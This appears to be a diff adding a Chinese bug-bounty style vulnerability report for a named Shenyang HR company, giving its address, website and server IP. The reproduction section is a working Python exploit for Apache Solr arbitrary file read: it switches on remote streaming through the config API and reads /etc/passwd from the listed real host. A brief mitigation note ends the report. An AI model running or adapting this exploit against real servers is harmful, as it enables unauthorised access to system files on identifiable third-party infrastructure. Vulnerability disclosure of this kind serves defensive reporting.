@@ -1,0 +1,41 @@
+厂商名称：沈阳快马速聘人力资源有限公司
+所属SRC：互联网空间-亿万守护计划
+漏洞标题：xxx网站存在敏感文件泄露
+漏洞类别：web
+漏洞类型: 事件型
+利用通用漏洞：是
+组件名称：Apache Solr <= 8.8.1任意文件读取漏洞
+漏洞等级：高危
+漏洞url：http://www.doujue.net:8983
+网站名称：沈阳快马速聘人力资源有限公司
+网站ip：120.53.248.29
+所属地区：辽宁省沈阳市沈河区青年大街185-1号1704
+漏洞描述：Apache Solr存在任意文件读取,漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件
+公司业务：许可项目：职业中介活动，劳务派遣服务，广播电视节目制作经营，互联网信息服务，第二类增值电信业务（依法须经批准的项目，经相关部门批准后方可开展经营活动，具体经营项目以审批结果为准） 一般项目：人力资源服务（不含职业中介活动、劳务派遣服务），网络技术服务，软件开发，信息技术咨询服务，技术服务、技术开发、技术咨询、技术交流、技术转让、技术推广，网络与信息安全软件开发，信息系统集成服务，办公服务，图文设计制作，广告设计、代理，广告发布（非广播电台、电视台、报刊出版单位），广告制作，企业形象策划，餐饮管理，企业管理，信息咨询服务（不含许可类信息咨询服务），市场营销策划，会议及展览服务，居民日常生活服务，组织文化艺术交流活动，外卖递送服务，珠宝首饰零售，日用品销售，服装服饰零售，鞋帽零售，箱包销售，日用百货销售，工艺美术品及收藏品零售（象牙及其制品除外），文艺创作，专业设计服务，化妆品零售，电子产品销售，皮革制品销售，教育咨询服务（不含涉许可审批的教育培训活动），企业管理咨询（除依法须经批准的项目外，凭营业执照依法自主开展经营活动）
+复现步骤：
+# -*- coding: utf-8 -*-
+import requests
+
+host = "http://http://120.53.248.29:8983"
+if host[-1] == '/':
+    host = host[:-1]
+
+
+def poc(host):
+    url = host + '/solr/admin/cores?indexInfo=false&wt=json'
+    core_data = requests.get(url, timeout=3).json()
+    if core_data['status']:
+        core = list(core_data['status'].keys())[0]
+        jsonp_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": 'true'}}
+        requests.post(url=host + "/solr/%s/config" % core, json=jsonp_data)
+
+        result_data = requests.post(url=host + '/solr/%s/debug/dump?param=ContentStreams' % core,
+                                    data={"stream.url": "file:///etc/passwd"}).json()
+        if result_data['streams']:
+            print(result_data['streams'][0]['stream'])
+    else:
+        exit("不存在此漏洞")
+
+
+poc(host)
+修复方案：由于官方拒绝修复该漏洞，因此请将Apache solr在内网中启动，若需要在公网中使用，需要限制访问ip 
